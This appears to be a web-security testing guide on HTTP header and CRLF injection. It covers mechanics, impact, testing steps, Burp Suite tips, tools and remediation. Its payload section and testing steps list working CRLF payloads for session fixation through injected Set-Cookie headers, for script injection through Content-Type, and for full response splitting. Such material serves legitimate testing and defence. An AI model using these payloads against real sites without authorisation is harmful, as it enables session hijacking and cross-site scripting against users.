# HTTP Header Injection

## Overview
HTTP Header Injection occurs when user-supplied input is included in an HTTP response header without proper sanitization, allowing an attacker to inject arbitrary headers. This can lead to HTTP Response Splitting, cache poisoning, cross-site scripting via headers, session fixation, or open redirect — depending on which header is injectable and how the application or intermediaries process the response.

## How It Works
- The server takes user input and places it in a response header (e.g., `Location: ` + redirect_url, `Set-Cookie: name=` + user_value, `Content-Disposition: filename=` + user_filename).
- If newline characters (`\r\n` / CRLF) are not stripped, the attacker can inject new header lines.
- This is related to CRLF injection — injecting `\r\n` effectively ends the current header and starts a new one.
- Without CRLF, single-header injection is still possible if the header value influences security decisions (e.g., injecting `;HttpOnly=false` into Set-Cookie).

## Impact
- HTTP Response Splitting (inject malicious headers into the response).
- Set arbitrary cookies (session fixation).
- Inject `Content-Type` to enable XSS.
- Cache poisoning by injecting cache control headers.
- Open redirect by controlling `Location` header.
- XSS via injected headers if reflected in JavaScript.
- Phishing / clickjacking by injecting `Content-Security-Policy`.

## Where to Look
- `Location:` redirect parameters: `?redirect=`, `?next=`, `?url=`, `?return_to=`.
- Cookie name/value parameters that get reflected in `Set-Cookie`.
- `Content-Disposition` in file download responses — filename from user input.
- User-supplied values in `X-` custom headers echoed back.
- Password reset and email confirmation flows with URLs in headers.
- Language/locale parameters reflected in response headers.

## Testing Steps
1. Find parameters whose values appear in response headers.
2. Submit a newline-injected payload: `%0d%0aX-Injected: yes`.
3. Check if `X-Injected: yes` appears as a separate response header.
4. If headers are injectable, escalate: try `%0d%0aSet-Cookie: sessionid=attacker_value`.
5. Try injecting XSS via a Content-Type header: `%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>`.
6. Test without CRLF: try injecting `;HttpOnly=false` into cookie parameters.
7. Check `Location` header with `\r\n` to split response and inject a new body.

## Payloads / Techniques
```
# URL-encoded CRLF
%0d%0a
%0D%0A
\r\n
%250d%250a   (double-encoded)

# Inject custom header
?redirect=https://example.com%0d%0aX-Injected:%20test

# Session fixation via Set-Cookie injection
?lang=en%0d%0aSet-Cookie:%20sessionid=attacker_value;%20HttpOnly=false

# XSS via Content-Type injection
?lang=en%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<img%20src=x%20onerror=alert(1)>

# Response splitting - inject entire second response
?url=https://good.com%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(1)</script></html>

# Content-Disposition filename injection
GET /download?filename=report.pdf%0d%0aX-Evil:%20header

# Cookie flag manipulation
?session=abc%3BHttpOnly%3Dfalse%3BSameSite%3DNone
```

## Burp Suite Tips
- In **Repeater**, submit `%0d%0aX-Test: injected` in redirect/cookie/header parameters.
- Check the **Response Headers** panel for injected headers.
- **Active Scanner** (Pro) tests for CRLF/header injection automatically.
- Use **Param Miner** to discover response headers influenced by request parameters.
- The **CRLF Injection Scanner** BApp extension adds dedicated header injection tests.

## Tools
- Burp Suite (Repeater + Scanner)
- crlfuzz — https://github.com/dwisiswant0/crlfuzz (automated CRLF injection scanner)
- SecLists CRLF injection payloads

## Remediation
- Strip or reject `\r` and `\n` characters from any user input that will be placed in an HTTP response header.
- Use framework-provided redirect functions that automatically handle header encoding (e.g., `response.redirect()` in Express).
- Validate redirect URLs against an allowlist of permitted destinations.
- Use an HTTP response library that prevents header injection at the framework level.
- Apply a strict Content-Security-Policy header.

## References
https://owasp.org/www-community/attacks/HTTP_Response_Splitting
https://portswigger.net/kb/issues/00200200_http-header-injection
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling
